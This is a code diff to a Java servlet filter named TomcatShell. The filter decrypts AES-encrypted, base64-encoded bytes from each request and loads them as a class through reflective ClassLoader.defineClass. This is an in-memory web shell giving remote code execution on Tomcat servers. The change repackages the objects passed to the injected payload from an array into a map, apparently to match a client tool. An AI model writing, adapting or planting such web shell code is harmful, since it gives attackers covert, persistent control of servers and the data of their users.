@@ -9,6 +9,8 @@ import java.io.IOException;
 import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
+import java.util.HashMap;
+import java.util.Map;
 
 
 public class TomcatShell implements Filter {
@@ -33,7 +35,11 @@ public class TomcatShell implements Filter {
                     req.getSession().putValue("u", this.key);
                     Cipher c = Cipher.getInstance("AES");
                     c.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
-                    Object[] objects = new Object[]{req,resp,req.getSession()};
+                    //Object[] objects = new Object[]{req,resp,req.getSession()};
+                    Map<String,Object> objects = new HashMap<String,Object>();
+                    objects.put("session",req.getSession());
+                    objects.put("response",resp);
+                    objects.put("request",req);
                     Method method = ClassLoader.class.getDeclaredMethod("defineClass",byte[].class,int.class,int.class);
                     method.setAccessible(true);
                     byte[] bytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(req.getReader().readLine()));
